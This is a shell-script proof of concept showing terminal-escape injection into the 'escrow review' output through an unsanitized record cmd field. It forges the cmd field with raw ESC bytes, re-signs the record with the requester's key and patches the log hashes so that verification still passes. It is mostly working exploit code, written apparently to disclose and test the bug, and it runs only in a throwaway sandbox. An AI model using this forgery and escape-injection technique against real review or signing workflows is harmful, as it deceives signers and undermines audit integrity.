#!/bin/sh
# PoC: terminal-escape injection into `escrow review` / `escrow sign` output
# through unsanitized record header fields (cmd / time / role-env).
#
# render() in src/cmd.c prints rec.cmd, rec.time, rec.role_env with a raw
# printf("%s"). record_read() (src/record.c) validates none of them for
# control bytes (only NUL and '\n' are structurally impossible). The honest
# propose path escapes argv via record_quote(), but a malicious requester --
# whom the threat model explicitly lets "hand-craft records" -- can put raw
# ESC bytes in the record, re-sign it with her own requester key, and fix her
# own propose log line. review/sign then emit the bytes verbatim, and
# verify-log still passes. The dedicated print_safe() sanitizer (which catches
# ESC in *file content*) never sees these fields.
#
# usage: record-field-escape.sh /abs/path/to/escrow
set -eu
escrow=${1:?usage: $0 /abs/path/to/escrow}
case $escrow in /*) ;; *) echo "need absolute escrow path" >&2; exit 2;; esac
policy=$(cd "$(dirname "$escrow")/.." && pwd)/role-test
[ -e "$policy" ] || policy=$(dirname "$escrow")/../role-test

tmp=$(mktemp -d)
trap 'chmod -R u+rwx "$tmp" 2>/dev/null; rm -rf "$tmp"' EXIT
cd "$tmp"
export ESCROW_STATE=$tmp/state ESCROW_ROLES=$tmp/roles
pub() { cut -d' ' -f1,2 "$1.pub"; }

for u in alice bob carol; do ssh-keygen -q -t ed25519 -N '' -C "$u" -f "$u"; done
{ echo "alice requester $(pub alice)"
  echo "bob reviewer $(pub bob)"
  echo "carol signer $(pub carol)"; } >roles

mkdir ws; echo hello >ws/f
# honest proposal by alice
"$escrow" --role "$policy" --workspace ws --key alice -- sh -c 'echo world >>f' \
  >/dev/null 2>/dev/null
id=$("$escrow" list | tail -n1 | cut -d' ' -f1)
rec=state/runs/$id/record

echo "=== cmd field in the record BEFORE tampering (honest, escaped) ==="
grep '^cmd' "$rec"

# raw ESC payload: OSC window-title set + SGR color + a fake benign cmd label.
# A real attacker uses cursor-up / erase-line to overwrite the diff the signer
# is about to read; here we just prove raw ESC reaches the terminal.
payload=$(printf '\033]0;OWNED\007\033[32msh -c format-only\033[0m\033[2K')
# cmd is record line 5; rewrite only that line, keep the rest byte-for-byte.
{ head -n4 "$rec"; printf 'cmd %s\n' "$payload"; tail -n +6 "$rec"; } >"$rec.new"
mv "$rec.new" "$rec"

# re-sign the tampered record with alice's (requester) key, same as escrow does
ssh-keygen -q -Y sign -f alice -n escrow-propose <"$rec" >"state/runs/$id/1-propose.sig"

# fix the single propose log line: new record sha + new sig sha (prev unchanged,
# it is the last line). Fields: seq time event id principal record sig extra roles prev
rsha=$(sha256sum "$rec" | cut -d' ' -f1)
ssha=$(sha256sum "state/runs/$id/1-propose.sig" | cut -d' ' -f1)
awk -v r="$rsha" -v s="$ssha" '{$6=r; $7=s; print}' state/log >state/log.new
mv state/log.new state/log

echo
echo "=== escrow review output, piped through cat -v (^[ == raw ESC 0x1b) ==="
"$escrow" review "$id" 2>/dev/null | cat -v | grep -n 'cmd' || true

echo
# raw-byte check: does review emit an actual 0x1b?
if "$escrow" review "$id" 2>/dev/null | grep -q "$(printf '\033')"; then
  echo "RESULT: POPPED -- raw ESC (0x1b) reached the terminal via the record cmd field"
  rc=0
else
  echo "RESULT: no raw ESC -- field is sanitized after all"
  rc=1
fi
echo
echo "=== verify-log still accepts this forged-but-signed history ==="
"$escrow" verify-log 2>/dev/null && echo "(verify-log PASSED on the injected proposal)"
exit $rc
